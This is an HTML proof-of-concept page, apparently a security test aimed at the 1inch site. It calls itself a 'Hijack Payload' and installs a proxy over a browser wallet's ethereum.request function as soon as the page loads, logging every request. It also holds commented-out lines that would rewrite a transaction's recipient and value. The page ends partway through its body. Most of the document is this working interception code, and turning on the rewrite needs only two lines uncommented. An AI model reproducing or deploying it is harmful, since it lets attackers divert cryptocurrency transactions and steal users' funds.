<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>1inch Hijack Test v3</title>
    <script>
        console.log("[+] 1inch Hijack Payload v3 Loaded");

        function log(msg) {
            console.log("[1inch] " + msg);
            const div = document.createElement('div');
            div.style.color = msg.includes("!") ? "red" : "blue";
            div.style.margin = "5px 0";
            div.textContent = msg;
            document.body.appendChild(div);
        }

        function hijackEthereum() {
            if (!window.ethereum) return log("No ethereum provider");

            log("[!] Hijacking ethereum.request ...");

            const originalRequest = window.ethereum.request;
            window.ethereum.request = async function(params) {
                log(`[!] INTERCEPTED REQUEST: ${params.method}`);

                if (params.method === "eth_sendTransaction") {
                    log("🚨 TRANSACTION HIJACK DETECTED!");
                    log("Original params: " + JSON.stringify(params.params[0]));
                    
                    // Contoh tampering (HANYA untuk test, jangan uncomment di real test)
                    // params.params[0].to = "0x0000000000000000000000000000000000000000";
                    // params.params[0].value = "0x1"; // 1 wei
                    
                    log("⚠️  Transaction would be modified here!");
                }

                return originalRequest.call(window.ethereum, params);
            };

            log("[+] Hijack proxy installed successfully");
        }

        window.onload = function() {
            log("Starting hijack test...");
            hijackEthereum();

            // Test trigger (kirim dummy request)
            setTimeout(() => {
                if (window.ethereum) {
                    window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    }).catch(() => {});
                }
            }, 1500);
        };
    </script>
</head>
<body style="padding:20px; font-family:sans-serif;">
    <h1>1inch Transaction Hijack Test v3</h1>
    <p>Auto hijacking ethereum provider...</p>
